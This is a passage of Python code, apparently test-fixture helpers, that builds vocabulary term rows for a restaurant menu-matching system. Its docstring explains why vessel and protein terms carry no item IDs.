        harvested_at=_HARVESTED_AT,
        nutrition_source_url=None,
        nutrition_harvested_at=None,
    )


def _term(slot: Slot, value: str, item_ids: tuple[str, ...]) -> VocabularyTerm:
    """One ``vocabulary`` row: what the model may say, and what it may mean.

    ``item_ids`` is empty for a vessel and a protein, exactly as the real build
    leaves it: each is half of an entree, and a matcher that could resolve
    either half alone would name a SKU without knowing what was in it.
    """
    return VocabularyTerm(
        slot=slot,
        value=value,
        name=published(value),
        item_ids=item_ids,
        derivation=_DERIVATIONS[slot],
        source_url=_MENU_URL,
        harvested_at=_HARVESTED_AT,
    )
